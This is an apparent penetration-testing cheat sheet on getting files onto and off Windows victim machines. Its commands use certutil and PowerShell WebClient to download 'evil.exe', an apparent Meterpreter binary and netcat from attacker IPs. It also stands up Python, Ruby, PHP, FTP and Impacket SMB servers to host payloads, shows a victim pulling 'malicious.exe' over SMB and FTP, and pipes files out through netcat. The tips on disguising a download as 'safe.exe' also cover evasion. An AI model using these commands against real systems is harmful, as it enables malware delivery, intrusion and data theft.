# Built in windows utility to download file:
## certutil.exe

```
certutil.exe -urlcache -split -f http://10.10.0.101/evil.exe safe.exe
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
```

## Powershell:
```
(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe","c:\nc.exe")	
wget "http://10.10.10.10/nc.exe" outfile "c:\nc.exe"	
```


# Start a Webserver with Python:
Whatever folder you start this in will be the folder listed and available online. 
so if you run this from the home folder, then you'd open a browser and go to the IP/PORT and see everything in the home folder.
-m is for module
## Python 2
``` 
python -m SimpleHTTPServer 8080
```
## Python 3
```
python3 -m http.server 8000
```
## Check:
browse to localhost:8000
## From Victim Machine:
browse to \<Attacker-IP\>:8000

# 'my_server.py':
```
#!/usr/bin/env python
from pyftpdlib import servers
from pyftpdlib.handlers import FTPHandler
address = ("0.0.0.0", 21)  # listen on every IP on my machine on port 21
server = servers.FTPServer(address, FTPHandler)
server.serve_forever()
```

# Run a ruby webrick basic http server
```
ruby -rwebrick -e "WEBrick::HTTPServer.new (:Port => 80, :DocumentRoot => Dir.pwd).start"
```

# Run a basic PHP http serve
```
php -S 0.0.0.0:80					r
```

# SMB share:
## setup SMB sharefrom Impacket:
/opt/impacket/examples:
```
python smbserver.py ROPNOP /root/shells
```

## From Windows:
```
net view \\192.168.1.29
dir \\192.168.1.29\folder
copy \\192.168.1.29\folder\mailicious.exe
```

### OR:
```
extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
```

# Setup FTP server:
## install and start FTP server:
```
apt-get install python-pyftpdlib
python -m pyftpdlib -p 21
```
## create anonymous ftp with write access to your filesystem.
```
python -m pyftpdlib
python -m pyftpdlib --help
python3 -m pyftpdlib.ftpserver
```

## Download file from Windows:
```
C:\>ftp 192.168.1.29
username: anonymous
password: whatever
ftp> binary
ftp> get malicious.exe
ftp> bye
```


# NetCat File Transfer:
nc is basically a built-in tool from any UNIX-like systems (even embedded systems), so it's perfect for "quick and temporary way to transfer files".
open a listen on port 12345, waiting for data.
## Step 1, on the receiver side, run:
```
nc -l 12345 | tar -xf -
```

## Step 2, on the sender side:
```
tar -cf - ALL_FILES_YOU_WANT_TO_SEND ... | nc $RECEIVER_IP 12345
```
### Alternate Step 2
#### You can also put pv in the middle to monitor the progress of transferring:
```
tar -cf - ALL_FILES_YOU_WANT_TO_SEND ...| pv | nc $RECEIVER_IP 12345
```
After the transferring is finished, both sides of nc will quit automatically, and job done.

# systemctl
using "systemctl enable" instead if "service * start" means the service will automatically start after reboot. 

### Examples:
```
systemctl enable postgresql
systemctl enable ssh 
systemctl disable ssh
```
